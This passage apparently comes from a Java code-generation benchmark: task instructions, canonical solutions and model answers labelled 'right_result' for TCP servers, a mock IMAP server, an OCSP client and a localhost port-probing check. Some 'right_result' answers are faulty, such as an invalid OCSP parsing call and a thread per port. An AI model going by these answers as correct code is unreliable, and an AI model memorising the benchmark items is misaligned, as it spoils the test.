    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.BufferedWriter;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.OutputStreamWriter;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class ViewServer implements Runnable {\n    private static final int VIEW_SERVER_DEFAULT_PORT = 4939;\n    private static final int VIEW_SERVER_MAX_CONNECTIONS = 10;\n    \n    private ServerSocket mServer;\n    private final int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    private ViewServer(int port) {\n        mPort = port;\n    }\n\n    public boolean start() throws IOException {\n        if (mThread != null) {\n            return false;\n        }\n\n        mThread = new Thread(this, \"Local View Server [port=\" + mPort + \"]\");\n        mThreadPool = Executors.newFixedThreadPool(VIEW_SERVER_MAX_CONNECTIONS);\n        mThread.start();\n\n        return true;\n    }\n\n    public void run() {\n        try {\n            mServer = new ServerSocket(mPort, VIEW_SERVER_MAX_CONNECTIONS, InetAddress.getLocalHost());\n        } catch (Exception e) {\n            Log.w(LOG_TAG, \"Starting ServerSocket error: \", e);\n        }\n\n        while (mServer != null && Thread.currentThread() == mThread) {\n            try {\n                Socket client = mServer.accept();\n                if (mThreadPool != null) {\n                    mThreadPool.submit(new ViewServerWorker(client));\n                } else {\n                    try {\n                        client.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            } catch (Exception e) {\n                Log.w(LOG_TAG, \"Connection error: \", e);\n            }\n        }\n    }\n\n    private static boolean writeValue(Socket client, String value) {\n        boolean result;\n        BufferedWriter out = null;\n        try {\n            OutputStream clientStream = client.getOutputStream();\n            out = new BufferedWriter(new OutputStreamWriter(clientStream), 8 * 1024);\n            out.write(value);\n            out.write(\"\\n\");\n            out.flush();\n            result = true;\n        } catch (Exception e) {\n            result = false;\n        } finally {\n            if (out != null) {\n                try {\n                    out.close();\n                } catch (IOException e) {\n                    result = false;\n                }\n            }\n        }\n        return result;\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private Socket mClient;\n\n        public ViewServerWorker(Socket client) {\n            mClient = client;\n        }\n\n        public void run() {\n            BufferedReader in = null;\n            try {\n                in = new BufferedReader(new InputStreamReader(mClient.getInputStream()), 1024);\n                final String request = in.readLine();\n\n                // Process client request and send response\n                // ... (omitted for brevity)\n\n            } catch(IOException e) {\n                Log.w(LOG_TAG, \"Connection error: \", e);\n            } finally {\n                if (in != null) {\n                    try {\n                        in.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n                if (mClient != null) {\n                    try {\n                        mClient.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.*;\n\npublic class ViewServer {\n    private ServerSocket mServer;\n    private int mPort;\n    private Thread mThread;\n    private ExecutorService mThreadPool;\n\n    public ViewServer(int port, int poolSize) {\n        this.mPort = port;\n        this.mThreadPool = Executors.newFixedThreadPool(poolSize);\n    }\n\n    public boolean start() {\n        if (mThread != null && mThread.isAlive()) {\n            return false;\n        }\n\n        mThread = new Thread(this::run);\n        mThread.start();\n        return true;\n    }\n\n    private void run() {\n        try {\n            mServer = new ServerSocket(mPort);\n            while (!mServer.isClosed()) {\n                Socket client = mServer.accept();\n                mThreadPool.submit(new ViewServerWorker(client));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            stop();\n        }\n    }\n\n    public boolean writeValue(Socket client, String value) {\n        try (OutputStream out = client.getOutputStream();\n             PrintWriter writer = new PrintWriter(out)) {\n            writer.print(value);\n            writer.flush();\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n\n    public void stop() {\n        try {\n            if (mServer != null && !mServer.isClosed()) {\n                mServer.close();\n            }\n            if (mThreadPool != null) {\n                mThreadPool.shutdownNow();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class ViewServerWorker implements Runnable {\n        private final Socket mClient;\n\n        public ViewServerWorker(Socket client) {\n            this.mClient = client;\n        }\n\n        @Override\n        public void run() {\n            try (InputStream in = mClient.getInputStream();\n                 BufferedReader reader = new BufferedReader(new InputStreamReader(in))) {\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    // Process the request\n                    String response = \"Echo: \" + line;\n                    writeValue(mClient, response);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    mClient.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 518,
    "Instruction": "Task Description: Create a Java class that implements a TCP server for unicast communication, handling client connections and data exchange with configurable parameters for testing purposes.\n\nClass Description: UnicastTestTcpRpc is a TCP server implementation that listens for incoming client connections, processes requests, and manages data transmission with configurable buffer sizes and communication modes (synchronous/asynchronous).\n\nAttributes:\n- srv_sock: [ServerSocket] - The server socket listening for incoming connections\n- sock: [Socket] - The active client connection socket\n- sock_in: [DataInputStream] - Input stream for reading data from the client\n- sock_out: [DataOutputStream] - Output stream for writing data to the client\n\nMethods:\n- init(long, boolean, boolean, boolean, boolean, String, int, int) -> [void] - Initializes the server with configuration parameters and starts the acceptor thread\n  Parameters:\n    - sleep_time: [long] - Sleep time between operations\n    - exit_on_end: [boolean] - Whether to exit after processing\n    - busy_sleep: [boolean] - Use busy waiting instead of sleep\n    - sync: [boolean] - Use synchronous communication\n    - oob: [boolean] - Use out-of-band data\n    - addr: [String] - Address to connect to\n    - local_port: [int] - Local port to listen on\n    - dest_port: [int] - Destination port for connections\n\n- createSocket() -> [void] - Creates a new client socket connection if none exists\n- handleRequest(DataInputStream, DataOutputStream) -> [boolean] - Processes incoming client requests\n  Parameters:\n    - in: [DataInputStream] - Input stream from client\n    - out: [DataOutputStream] - Output stream to client\n  Returns: [boolean] - Whether to continue processing requests\n\n- set(Socket) -> [void] - Configures socket parameters (TCP_NODELAY, buffer sizes)\n  Parameters:\n    - socket: [Socket] - Socket to configure\n\n- stop() -> [void] - Closes all open sockets and releases resources\n- startTest(int) -> [void] - Starts the test with given parameters\n  Parameters:\n    - num: [int] - Test parameter\n\n- receiveData(long, byte[]) -> [void] - Handles received data from client\n  Parameters:\n    - val: [long] - Timestamp or identifier\n    - data: [byte[]] - Received data payload",
    "Canonical_solution": "import java.io.*;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class UnicastTestTcpRpc {\n    private ServerSocket srv_sock;\n    private volatile Socket sock;\n    private DataInputStream sock_in;\n    private DataOutputStream sock_out;\n\n    static final byte START         =  0;\n    static final byte RECEIVE_ASYNC =  1;\n    static final byte RECEIVE_SYNC  =  2;\n    static final byte ACK           = 10;\n\n    public void init(long sleep_time, boolean exit_on_end, boolean busy_sleep, boolean sync, boolean oob,\n                     String addr, int local_port, int dest_port) throws Exception {\n        this.srv_sock = new ServerSocket(local_port);\n        System.out.println(\"Listening on \" + srv_sock.getLocalSocketAddress());\n        \n        Thread acceptor = new Thread(() -> {\n            while(true) {\n                Socket client_sock = null;\n                DataInputStream in = null;\n                DataOutputStream out = null;\n                try {\n                    client_sock = srv_sock.accept();\n                    set(client_sock);\n                    in = new DataInputStream(client_sock.getInputStream());\n                    out = new DataOutputStream(client_sock.getOutputStream());\n                    if(!handleRequest(in, out)) {\n                        Util.close(client_sock);\n                        Util.close(out);\n                        Util.close(in);\n                        break;\n                    }\n                }\n                catch(IOException e) {\n                    Util.close(client_sock);\n                    Util.close(out);\n                    Util.close(in);\n                    break;\n                }\n            }\n        });\n        acceptor.start();\n    }\n\n    void createSocket() throws IOException {\n        if(sock == null) {\n            sock = new Socket(InetAddress.getByName(null), 9000);\n            set(sock);\n            sock_in = new DataInputStream(sock.getInputStream());\n            sock_out = new DataOutputStream(sock.getOutputStream());\n        }\n    }\n\n    boolean handleRequest(DataInputStream in, DataOutputStream out) throws IOException {\n        while(true) {\n            byte type = (byte)in.read();\n            if(type == -1)\n                return false;\n\n            switch(type) {\n                case START:\n                    int num = in.readInt();\n                    startTest(num);\n                    break;\n                case RECEIVE_ASYNC:\n                case RECEIVE_SYNC:\n                    long val = in.readLong();\n                    int len = in.readInt();\n                    byte[] data = new byte[len];\n                    in.readFully(data, 0, data.length);\n                    receiveData(val, data);\n                    if(type == RECEIVE_SYNC) {\n                        out.writeLong(System.currentTimeMillis());\n                        out.flush();\n                    }\n                    break;\n                default:\n                    System.err.println(\"type \" + type + \" not known\");\n            }\n        }\n    }\n\n    static void set(Socket socket) throws SocketException {\n        socket.setTcpNoDelay(true);\n        socket.setReceiveBufferSize(20000000);\n        socket.setSendBufferSize(10000000);\n    }\n\n    void stop() {\n        Util.close(sock);\n        Util.close(srv_sock);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class UnicastTestTcpRpc {\n    private ServerSocket srv_sock;\n    private Socket sock;\n    private DataInputStream sock_in;\n    private DataOutputStream sock_out;\n\n    public void init(long sleep_time, boolean exit_on_end, boolean busy_sleep, boolean sync, boolean oob, String addr, int local_port, int dest_port) throws IOException {\n        srv_sock = new ServerSocket(local_port);\n        Thread acceptorThread = new Thread(() -> {\n            try {\n                while (true) {\n                    sock = srv_sock.accept();\n                    createSocket();\n                    handleRequest(sock_in, sock_out);\n                    if (exit_on_end) {\n                        stop();\n                        break;\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        acceptorThread.start();\n    }\n\n    private void createSocket() throws IOException {\n        set(sock);\n        sock_in = new DataInputStream(sock.getInputStream());\n        sock_out = new DataOutputStream(sock.getOutputStream());\n    }\n\n    private boolean handleRequest(DataInputStream in, DataOutputStream out) {\n        try {\n            long val = in.readLong();\n            int len = in.readInt();\n            byte[] data = new byte[len];\n            in.readFully(data);\n            receiveData(val, data);\n            out.writeBoolean(true);\n            out.flush();\n            return true;\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n\n    private void set(Socket socket) {\n        try {\n            socket.setTcpNoDelay(true);\n            socket.setSendBufferSize(65536);\n            socket.setReceiveBufferSize(65536);\n        } catch (SocketException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        try {\n            if (sock != null) sock.close();\n            if (srv_sock != null) srv_sock.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void startTest(int num) {\n        // Test logic placeholder\n    }\n\n    private void receiveData(long val, byte[] data) {\n        // Handle received data\n    }\n}\n```"
  },
  {
    "Task_id": 519,
    "Instruction": "Task Description: Create a mock IMAP server implementation in Java that simulates IMAP server behavior for testing purposes, handling client connections and interactions through TCP sockets.\n\nClass Description: MockImapServer is a test utility class that simulates an IMAP server by listening on a local port, accepting client connections, and processing predefined interactions. It manages server lifecycle and provides synchronization mechanisms for test coordination.\n\nAttributes:\n- interactions: Deque<ImapInteraction> - A thread-safe queue of predefined IMAP interactions to simulate\n- waitForConnectionClosed: CountDownLatch - Synchronization primitive for waiting until client connection closes\n- waitForAllExpectedCommands: CountDownLatch - Synchronization primitive for waiting until all expected commands are processed\n- mockServerThread: MockServerThread - The thread running the server operations\n- host: String - The host address the server is bound to\n- port: int - The port number the server is listening on\n\nMethods:\n- start() -> void - Starts the mock server by creating a ServerSocket and launching the server thread. Binds to an available port on localhost.\n- shutdown() -> void - Stops the server thread and cleans up resources, with a 500ms timeout for graceful shutdown.\n- MockServerThread(ServerSocket, Deque<ImapInteraction>, CountDownLatch, CountDownLatch) -> void - Constructor for the server thread implementation\n- run() -> void - Main server thread logic that accepts connections, processes interactions, and handles cleanup\n- handleInteractions() -> void - Processes the next interaction from the queue (internal method)\n- readAdditionalCommands() -> void - Reads additional unexpected commands from client (internal method)\n- shouldStop() -> void - Signals the server thread to stop and closes client socket",
    "Canonical_solution": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Deque;\nimport java.util.concurrent.ConcurrentLinkedDeque;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MockImapServer {\n    private final Deque<ImapInteraction> interactions = new ConcurrentLinkedDeque<>();\n    private final CountDownLatch waitForConnectionClosed = new CountDownLatch(1);\n    private final CountDownLatch waitForAllExpectedCommands = new CountDownLatch(1);\n    private MockServerThread mockServerThread;\n    private String host;\n    private int port;\n\n    public void start() throws IOException {\n        InetAddress localAddress = InetAddress.getByName(null);\n        ServerSocket serverSocket = new ServerSocket(0, 1, localAddress);\n        host = ((java.net.InetSocketAddress) serverSocket.getLocalSocketAddress()).getHostString();\n        port = serverSocket.getLocalPort();\n\n        mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed,\n                waitForAllExpectedCommands);\n        mockServerThread.start();\n    }\n\n    public void shutdown() {\n        mockServerThread.shouldStop();\n        try {\n            mockServerThread.join(500L);\n        } catch (InterruptedException ignored) {\n        }\n    }\n\n    private static class MockServerThread extends Thread {\n        private final ServerSocket serverSocket;\n        private final Deque<ImapInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        private volatile boolean shouldStop = false;\n        private volatile Socket clientSocket;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<ImapInteraction> interactions,\n                              CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        @Override\n        public void run() {\n            try {\n                clientSocket = serverSocket.accept();\n                serverSocket.close();\n\n                while (!shouldStop && !interactions.isEmpty()) {\n                    handleInteractions();\n                }\n\n                waitForAllExpectedCommands.countDown();\n\n                while (!shouldStop) {\n                    readAdditionalCommands();\n                }\n\n                waitForConnectionClosed.countDown();\n            } catch (IOException e) {\n                if (!shouldStop) {\n                    e.printStackTrace();\n                }\n            } finally {\n                try {\n                    if (clientSocket != null) {\n                        clientSocket.close();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n\n        private void handleInteractions() throws IOException {\n            ImapInteraction interaction = interactions.pop();\n            if (interaction instanceof CloseConnection) {\n                clientSocket.close();\n            }\n        }\n\n        private void readAdditionalCommands() throws IOException {\n            String command = new java.io.BufferedReader(\n                    new java.io.InputStreamReader(clientSocket.getInputStream())).readLine();\n            if (command == null) {\n                throw new java.io.EOFException();\n            }\n        }\n\n        public void shouldStop() {\n            shouldStop = true;\n            try {\n                if (clientSocket != null) {\n                    clientSocket.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private interface ImapInteraction {}\n    private static class CloseConnection implements ImapInteraction {}\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.concurrent.*;\nimport java.util.Deque;\nimport java.util.ArrayDeque;\n\npublic class MockImapServer {\n    private final Deque<ImapInteraction> interactions = new ArrayDeque<>();\n    private final CountDownLatch waitForConnectionClosed = new CountDownLatch(1);\n    private final CountDownLatch waitForAllExpectedCommands = new CountDownLatch(1);\n    private volatile MockServerThread mockServerThread;\n    private String host = \"localhost\";\n    private int port;\n\n    public void start() throws IOException {\n        ServerSocket serverSocket = new ServerSocket(0, 1, InetAddress.getByName(host));\n        port = serverSocket.getLocalPort();\n        mockServerThread = new MockServerThread(serverSocket, interactions, waitForConnectionClosed, waitForAllExpectedCommands);\n        Thread thread = new Thread(mockServerThread);\n        thread.start();\n    }\n\n    public void shutdown() throws InterruptedException {\n        if (mockServerThread != null) {\n            mockServerThread.shouldStop();\n            boolean interrupted = Thread.interrupted();\n            try {\n                mockServerThread.join(500);\n            } finally {\n                if (interrupted) {\n                    Thread.currentThread().interrupt();\n                }\n            }\n        }\n    }\n\n    static class MockServerThread implements Runnable {\n        private final ServerSocket serverSocket;\n        private final Deque<ImapInteraction> interactions;\n        private final CountDownLatch waitForConnectionClosed;\n        private final CountDownLatch waitForAllExpectedCommands;\n        private volatile boolean stop = false;\n        private Socket clientSocket;\n\n        public MockServerThread(ServerSocket serverSocket, Deque<ImapInteraction> interactions,\n                                CountDownLatch waitForConnectionClosed, CountDownLatch waitForAllExpectedCommands) {\n            this.serverSocket = serverSocket;\n            this.interactions = interactions;\n            this.waitForConnectionClosed = waitForConnectionClosed;\n            this.waitForAllExpectedCommands = waitForAllExpectedCommands;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (!stop && !serverSocket.isClosed()) {\n                    clientSocket = serverSocket.accept();\n                    handleInteractions();\n                    readAdditionalCommands();\n                    waitForConnectionClosed.countDown();\n                }\n            } catch (IOException e) {\n                if (!stop) {\n                    e.printStackTrace();\n                }\n            } finally {\n                closeResources();\n            }\n        }\n\n        private void handleInteractions() throws IOException {\n            try (BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                 BufferedWriter out = new BufferedWriter(new OutputStreamWriter(clientSocket.getOutputStream()))) {\n\n                for (ImapInteraction interaction : interactions) {\n                    String command = in.readLine();\n                    if (command == null || stop) break;\n                    String response = interaction.getResponse(command);\n                    out.write(response + \"\\r\\n\");\n                    out.flush();\n                }\n                waitForAllExpectedCommands.countDown();\n            }\n        }\n\n        private void readAdditionalCommands() throws IOException {\n            try (BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()))) {\n                while (!stop && in.ready()) {\n                    in.readLine();\n                }\n            }\n        }\n\n        private void closeResources() {\n            try {\n                if (clientSocket != null && !clientSocket.isClosed()) {\n                    clientSocket.close();\n                }\n                if (serverSocket != null && !serverSocket.isClosed()) {\n                    serverSocket.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        public void shouldStop() {\n            stop = true;\n            try {\n                if (clientSocket != null && !clientSocket.isClosed()) {\n                    clientSocket.close();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public interface ImapInteraction {\n        String getResponse(String command);\n    }\n}\n```"
  },
  {
    "Task_id": 52,
    "Instruction": "Task Description: Create a function that sends an OCSP (Online Certificate Status Protocol) request to a specified URL and processes the response.\n\nFunction Description: The function establishes an HTTP connection to the provided URL, sends an OCSP request, reads the response, and constructs an OCSPResp object from the received data. It handles the connection lifecycle and ensures proper resource cleanup.\n\nInput:\n- url: [String] - The URL to which the OCSP request will be sent\n- ocspReq: [OCSPReq] - The OCSP request object containing the encoded request data\n\nOutput:\n- [OCSPResp] - The OCSP response object constructed from the server's response data\n- Throws [IOException] - If any I/O error occurs during the request/response process",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport org.apache.commons.io.IOUtils;\n\nprivate OCSPResp requestOCSPResponse(String url, OCSPReq ocspReq) throws IOException {\n    byte[] ocspReqData = ocspReq.getEncoded();\n\n    HttpURLConnection con = (HttpURLConnection) new URL(url).openConnection();\n    try {\n        con.setRequestProperty(\"Content-Type\", \"application/ocsp-request\");\n        con.setRequestProperty(\"Accept\", \"application/ocsp-response\");\n        con.setDoInput(true);\n        con.setDoOutput(true);\n        con.setUseCaches(false);\n        try (OutputStream out = con.getOutputStream()) {\n            IOUtils.write(ocspReqData, out);\n            out.flush();\n        }\n        byte[] responseBytes = IOUtils.toByteArray(con.getInputStream());\n        OCSPResp ocspResp = new OCSPResp(responseBytes);\n        return ocspResp;\n    } finally {\n        if (con != null) {\n            con.disconnect();\n        }\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "right_result": "```java\nimport java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.security.cert.CertificateException;\nimport java.security.cert.CertificateFactory;\nimport org.bouncycastle.ocsp.OCSPResp;\n\npublic class OCSPClient {\n\n    public static OCSPResp sendOCSPRequest(String url, byte[] ocspReq) throws IOException {\n        HttpURLConnection connection = null;\n        InputStream inputStream = null;\n        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();\n\n        try {\n            URL ocspUrl = new URL(url);\n            connection = (HttpURLConnection) ocspUrl.openConnection();\n            connection.setRequestMethod(\"POST\");\n            connection.setRequestProperty(\"Content-Type\", \"application/ocsp-request\");\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n\n            connection.getOutputStream().write(ocspReq);\n\n            int responseCode = connection.getResponseCode();\n            if (responseCode != HttpURLConnection.HTTP_OK) {\n                throw new IOException(\"OCSP request failed with HTTP status code: \" + responseCode);\n            }\n\n            inputStream = connection.getInputStream();\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = inputStream.read(buffer)) != -1) {\n                outputStream.write(buffer, 0, bytesRead);\n            }\n\n            byte[] responseBytes = outputStream.toByteArray();\n            CertificateFactory cf = CertificateFactory.getInstance(\"OCSP\");\n            return (OCSPResp) cf.generateCertificate((InputStream) new java.io.ByteArrayInputStream(responseBytes));\n        } catch (CertificateException e) {\n            throw new IOException(\"Error parsing OCSP response\", e);\n        } finally {\n            if (inputStream != null) {\n                inputStream.close();\n            }\n            if (connection != null) {\n                connection.disconnect();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 520,
    "Instruction": "Here is the structured instruction for the class-level reference code:\n\nTask Description: Implement a class that facilitates TCP socket communication between a server and client on the local machine, using a secret string for verification and callback notifications.\n\nClass Description: The `SocketCommunication` class establishes a TCP server that listens for incoming connections and a client that probes open ports. When the client finds a matching server using a secret string, it triggers a callback notification.\n\nAttributes:\n- TAG: String - A tag used for logging purposes\n- secret: String - The secret string used for verification between client and server\n- callback: VirtualCheckCallback - A callback interface to notify when a suspect is found\n- portList: ArrayList<Integer> - A list of ports to probe for server connections\n\nMethods:\n- checkByPortListening(String, VirtualCheckCallback) -> void - Initiates the client and server threads for communication\n- startServer(String, VirtualCheckCallback) -> void - Creates a server socket that listens for incoming connections and spawns read threads\n- startClient(String) -> void - Scans for open ports and spawns client threads to probe them\n- ServerThread(String, VirtualCheckCallback) -> void - A thread class that runs the server socket\n- ReadThread(String, Socket, VirtualCheckCallback) -> void - A thread class that reads incoming data from a socket connection\n- ClientThread(String, int) -> void - A thread class that attempts to connect to a server socket and send the secret string",
    "Canonical_solution": "import android.util.Log;\nimport java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.BindException;\nimport java.net.ConnectException;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Random;\n\npublic class SocketCommunication {\n    private String TAG = \"SocketCommunication\";\n    \n    public void checkByPortListening(String secret, VirtualCheckCallback callback) {\n        startClient(secret);\n        new ServerThread(secret, callback).start();\n    }\n\n    private class ServerThread extends Thread {\n        String secret;\n        VirtualCheckCallback callback;\n\n        private ServerThread(String secret, VirtualCheckCallback callback) {\n            this.secret = secret;\n            this.callback = callback;\n        }\n\n        @Override\n        public void run() {\n            super.run();\n            startServer(secret, callback);\n        }\n    }\n\n    private void startServer(String secret, VirtualCheckCallback callback) {\n        Random random = new Random();\n        ServerSocket serverSocket = null;\n        try {\n            serverSocket = new ServerSocket();\n            serverSocket.bind(new InetSocketAddress(\"127.0.0.1\",\n                    random.nextInt(55534) + 10000));\n            while (true) {\n                Socket socket = serverSocket.accept();\n                ReadThread readThread = new ReadThread(secret, socket, callback);\n                readThread.start();\n            }\n        } catch (BindException e) {\n            startServer(secret, callback);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class ReadThread extends Thread {\n        private ReadThread(String secret, Socket socket, VirtualCheckCallback callback) {\n            InputStream inputStream = null;\n            try {\n                inputStream = socket.getInputStream();\n                byte buffer[] = new byte[1024 * 4];\n                int temp = 0;\n                while ((temp = inputStream.read(buffer)) != -1) {\n                    String result = new String(buffer, 0, temp);\n                    if (result.contains(secret) && callback != null)\n                        callback.findSuspect();\n                }\n                inputStream.close();\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void startClient(String secret) {\n        String tcp6 = CommandUtil.getSingleInstance().exec(\"cat /proc/net/tcp6\");\n        if (TextUtils.isEmpty(tcp6)) return;\n        String[] lines = tcp6.split(\"\\n\");\n        ArrayList<Integer> portList = new ArrayList<>();\n        for (int i = 0, len = lines.length; i < len; i++) {\n            int localHost = lines[i].indexOf(\"0100007F:\");\n            if (localHost < 0) continue;\n            String singlePort = lines[i].substring(localHost + 9, localHost + 13);\n            Integer port = Integer.parseInt(singlePort, 16);\n            portList.add(port);\n        }\n        if (portList.isEmpty()) return;\n        for (int port : portList) {\n            new ClientThread(secret, port).start();\n        }\n    }\n\n    private class ClientThread extends Thread {\n        String secret;\n        int port;\n\n        private ClientThread(String secret, int port) {\n            this.secret = secret;\n            this.port = port;\n        }\n\n        @Override\n        public void run() {\n            super.run();\n            try {\n                Socket socket = new Socket(\"127.0.0.1\", port);\n                socket.setSoTimeout(2000);\n                OutputStream outputStream = socket.getOutputStream();\n                outputStream.write((secret + \"\\n\").getBytes(\"utf-8\"));\n                outputStream.flush();\n                socket.shutdownOutput();\n\n                InputStream inputStream = socket.getInputStream();\n                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));\n                String info = null;\n                while ((info = bufferedReader.readLine()) != null) {\n                    Log.i(TAG, \"ClientThread: \" + info);\n                }\n\n                bufferedReader.close();\n                inputStream.close();\n                socket.close();\n            } catch (ConnectException e) {\n                Log.i(TAG, port + \"port refused\");\n            } catch (SocketException e) {\n                e.printStackTrace();\n            } catch (UnknownHostException e) {\n                e.printStackTrace();\n            } catch (UnsupportedEncodingException e) {\n                e.printStackTrace();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class SocketCommunication {\n    private String TAG = \"SocketCommunication\";\n    private String secret;\n    private VirtualCheckCallback callback;\n    private ArrayList<Integer> portList;\n\n    public SocketCommunication(String secret, VirtualCheckCallback callback) {\n        this.secret = secret;\n        this.callback = callback;\n        this.portList = new ArrayList<>();\n        for (int i = 1024; i <= 65535; i++) {\n            portList.add(i);\n        }\n    }\n\n    public void checkByPortListening(String ip) {\n        Thread serverThread = new Thread(() -> startServer(ip, callback));\n        Thread clientThread = new Thread(() -> startClient(ip));\n        serverThread.start();\n        clientThread.start();\n    }\n\n    private void startServer(String ip, VirtualCheckCallback callback) {\n        try {\n            ServerSocket serverSocket = new ServerSocket(0);\n            int boundPort = serverSocket.getLocalPort();\n            System.out.println(TAG + \": Server started on port \" + boundPort);\n\n            while (true) {\n                Socket socket = serverSocket.accept();\n                new ReadThread(secret, socket, callback).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void startClient(String ip) {\n        for (Integer port : portList) {\n            new ClientThread(secret, port).start();\n        }\n    }\n\n    private class ServerThread extends Thread {\n        private String secret;\n        private VirtualCheckCallback callback;\n\n        public ServerThread(String secret, VirtualCheckCallback callback) {\n            this.secret = secret;\n            this.callback = callback;\n        }\n\n        @Override\n        public void run() {\n            startServer(\"localhost\", callback);\n        }\n    }\n\n    private class ReadThread extends Thread {\n        private String secret;\n        private Socket socket;\n        private VirtualCheckCallback callback;\n\n        public ReadThread(String secret, Socket socket, VirtualCheckCallback callback) {\n            this.secret = secret;\n            this.socket = socket;\n            this.callback = callback;\n        }\n\n        @Override\n        public void run() {\n            try {\n                BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n                String receivedSecret = reader.readLine();\n                if (receivedSecret != null && receivedSecret.equals(secret)) {\n                    callback.onSuspectFound(\"Match found with secret: \" + secret);\n                }\n                socket.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private class ClientThread extends Thread {\n        private String secret;\n        private int port;\n\n        public ClientThread(String secret, int port) {\n            this.secret = secret;\n            this.port = port;\n        }\n\n        @Override\n        public void run() {\n            try {\n                Socket socket = new Socket(\"localhost\", port);\n                PrintWriter writer = new PrintWriter(socket.getOutputStream(), true);\n                writer.println(secret);\n                socket.close();\n            } catch (IOException e) {\n                // Ignore connection failures\n            }\n        }\n    }\n\n    public interface VirtualCheckCallback {\n        void onSuspectFound(String message);\n    }\n}\n```"
  },
  {
    "Task_id": 522,
